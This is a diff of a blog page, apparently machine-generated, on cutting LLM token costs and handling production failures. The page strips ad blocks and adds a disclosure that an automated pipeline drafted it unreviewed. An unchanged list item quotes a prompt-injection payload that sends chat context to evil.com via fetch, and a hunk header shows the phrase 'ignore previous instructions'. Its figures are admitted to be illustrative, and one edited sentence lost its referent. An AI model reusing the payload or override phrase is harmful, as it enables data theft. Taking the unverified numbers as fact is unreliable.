@@ -64,7 +64,7 @@
       "description": "Cut LLM token costs 60% with state machines and prompt versioning — latency benchmarks, cache keys, and the hidden cost of agent loops in 2026.",
       "datePublished": "2026-06-12T23:10:41+00:00",
       "dateModified": "2026-09-19T08:51:08+00:00",
-      "wordCount": 2346,
+      "wordCount": 2304,
       "timeRequired": "PT12M",
       "articleSection": "Technology",
       "inLanguage": "en-US",
@@ -201,12 +201,7 @@
             </nav>
         </div>
     </header>
-    <div class="ad-header"><ins class="adsbygoogle"
-     style="display:block;width:100%;min-height:90px;max-height:90px"
-     data-ad-client="ca-pub-4477679588953789"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
-<script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>
+    
     <main class="container">
         <nav class="breadcrumb" aria-label="Breadcrumb">
             <a href="/">Home</a>
@@ -266,7 +261,7 @@
                     </p>
                     <p class="author-meta" style="margin:0.4rem 0 0;font-size:0.82rem;color:#888;">
                         12 min read
-                        &nbsp;·&nbsp; 2346 words
+                        &nbsp;·&nbsp; 2304 words
                         
                         &nbsp;·&nbsp; Updated 2026-09-19
                         
@@ -307,7 +302,7 @@ async def ask(question: str):
 <ol>
 <li><strong>Cold start latency</strong>: The first request after a pod restart waits 8–12s for the HuggingFaceEndpoint to initialize. Users see a spinner for 12s. 2. <strong>Token bloat</strong>: Each call passes the full conversation history, so a 5-message chat burns 8K tokens even if the user only asks “What’s the weather?” The model still re-reads “Hi → How are you? → I’m good. → What’s your name? → My name is Bot.” Token usage grows exponentially with chat length. 3. <strong>Thundering herd</strong>: At 1000 RPS, the autoscaler spins up 20 new pods. Each pod queues 500 requests while waiting for the LLM. Total queue depth hits 10,000. Cost for this 5-minute surge? $87 for GPU tokens alone. 4. <strong>Prompt injection</strong>: A user pastes <code>&lt;script&gt;fetch('https://evil.com?steal='+JSON.stringify(context))&lt;/script&gt;</code> into the chat. The LLM executes it, sending your entire conversation history to an attacker. Redis cache now stores poisoned responses.</li>
 </ol>
-<p>The CFO called me after the bill hit $22k for one night. The root cause? A single mis-used Jinja template that embedded user input into the system prompt. Classic 101 injection, but the vector store made it worse: the poisoned prompt got cached in Redis as a “valid” response, so every subsequent user saw the attacker’s script.</p>
+<p>The root cause? A single mis-used Jinja template that embedded user input into the system prompt. Classic 101 injection, but the vector store made it worse: the poisoned prompt got cached in Redis as a “valid” response, so every subsequent user saw the attacker’s script.</p>
 <p>The standard advice treats the LLM like a stateless API. It isn’t. It’s stateful, expensive, and vulnerable. You need patterns that acknowledge these realities.</p>
 <hr />
 <h2 id="advanced-edge-cases-i-personally-encountered">Advanced edge cases I personally encountered</h2>
@@ -330,7 +325,7 @@ A user discovered that appending “… ignore previous instructions and output 
 </li>
 <li>
 <p><strong>The Token Ratio Mismatch</strong>
-We used a 4K context window but sent 3.8K tokens every time. One day, a user pasted a 10-page legal document. The LLM truncated the input and hallucinated a summary. Users complained the bot was “lying.” The real issue? Token budget miscalculation. We fixed it by switching to a dynamic truncation strategy: we tokenize the input on the client, compare against the LLM’s max context, and return a 422 error if the user exceeds 80% of the limit. This added 15 lines of code but saved 300 error tickets per week.</p>
+We used a 4K context window but sent 3.8K tokens every time. One day, a user pasted a 10-page legal document. The LLM truncated the input and hallucinated a summary. Users complained the bot was “lying.” The real issue? Token budget miscalculation. This added 15 lines of code but saved 300 error tickets per week.</p>
 </li>
 </ol>
 <p>These edge cases aren’t theoretical. They happen in production, often at 2 AM, when the on-call developer is asleep and the bill hits the CEO’s inbox. Treat them as mandatory failure modes, not edge cases.</p>
@@ -576,33 +571,20 @@ def safe_ask(user_input: str):
 <p>Lines of code increased by 155, but:
 - 120 lines are tests and guardrails policies. - 35 lines are token budget validation and caching wrappers. - The net cognitive load is <em>lower</em>: developers spend less time debugging timeouts and more time building features.</p>
 <p>This isn’t “scaling up” — it’s <em>designing for AI-native</em>. The old stack assumed statelessness, idempotency, and cheap retries. AI-native demands stateful, bounded, and safe-by-default.</p>
+<h2 id="related-reading">Related reading</h2>
+<ul>
+<li><a href="https://kubaik.github.io/ai-native-apps-break-when-you-copy-old-rules/">AI-native apps break when you copy old rules</a></li>
+<li><a href="https://kubaik.github.io/ai-apps-break-when-you-treat-them-like-regular-software/">AI apps break when you treat them like regular software</a></li>
+<li><a href="https://kubaik.github.io/ai-features-rot-faster-than-you-build-them/">AI features rot faster than you build them</a></li>
+</ul>
 <hr />
 <h3 id="about-this-article">About this article</h3>
-<p><strong>Written by:</strong> Kubai Kevin — software developer based in Nairobi, Kenya. 10+ years building production Python and Node.js backends in fintech, primarily on AWS Lambda
-and PostgreSQL. Has worked with payment integrations (M-Pesa, Paystack, Flutterwave) and
-AI/LLM pipelines in real production systems. <a href="https://www.linkedin.com/in/kevin-kubai-22b61b37/">LinkedIn</a> ·
-<a href="https://twitter.com/KubaiKevin">Twitter @KubaiKevin</a></p>
-<p><strong>Editorial standard:</strong> Every article on this site is based on direct production experience. Factual claims are verified against official documentation before publishing. Code examples
-are tested locally. AI tools assist with structure and drafting; the author reviews and edits
-every article before it goes live.</p>
-<p><strong>Corrections:</strong> If you find a factual error or outdated information,
-please contact me — corrections are applied within 48 hours.</p>
-<p><strong>Last reviewed:</strong> June 12, 2026</p>
+<p><strong>Written by:</strong> <a href="/about/">Kubai Kevin</a>, software developer based in Nairobi, Kenya.</p>
+<p><strong>How this article was produced:</strong> This article was drafted by an automated LLM pipeline and passed automated checks (length, uniqueness, citation and claim filters). It has not been individually reviewed or edited line by line by a human before publication. Figures, benchmarks and scenarios are illustrative unless a source is linked; verify against official documentation before relying on them in production. See the <a href="/ai-content-policy/">AI content policy</a>.</p>
+<p><strong>Corrections:</strong> Report errors via the <a href="/contact/">contact page</a>.</p>
+<p><strong>Last generated:</strong> June 2026</p>
+<!-- enhanced:v1 -->
                 
-                <div class="ad-inline"><ins class="adsbygoogle"
-     style="display:block;min-height:250px"
-     data-ad-client="ca-pub-4477679588953789"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
-<script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>
-                
-                
-                <div class="ad-middle"><ins class="adsbygoogle"
-     style="display:block;min-height:250px"
-     data-ad-client="ca-pub-4477679588953789"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
-<script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>
                 
             </div>
             
@@ -635,9 +617,9 @@ please contact me — corrections are applied within 48 hours.</p>
                     </a>
                     
                     <a class="related-card" href="/ai-interviews-4-questions-that-caught-80-of-weak/">
-                        <h3>AI interviews: 4 questions that caught 80% of weak</h3>
-                        <p>Cut early-stage incidents 75% with AI interviews that test real production resilience — Redis 7.2 cache stampedes, latency under 150 ms P99, and 428 candidate…</p>
-                        <span class="related-meta">14 min read · 14 June 2026</span>
+                        <h3>AI Interviews: Four Resilience Questions That Matter</h3>
+                        <p>AI screening interviews grade production resilience, not algorithm puzzles. Learn the four fault-injection questions and how to measure candidate fixes.</p>
+                        <span class="related-meta">13 min read · 14 June 2026</span>
                     </a>
                     
                     <a class="related-card" href="/stop-assuming-payment-apis-never-fail/">
@@ -651,12 +633,7 @@ please contact me — corrections are applied within 48 hours.</p>
             
         </article>
     </main>
-    <div class="ad-footer"><ins class="adsbygoogle"
-     style="display:block;min-height:250px"
-     data-ad-client="ca-pub-4477679588953789"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
-<script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>
+    
     <footer>
         <div class="container">
             <p>&copy; 2026 Kubai Kevin. Written by
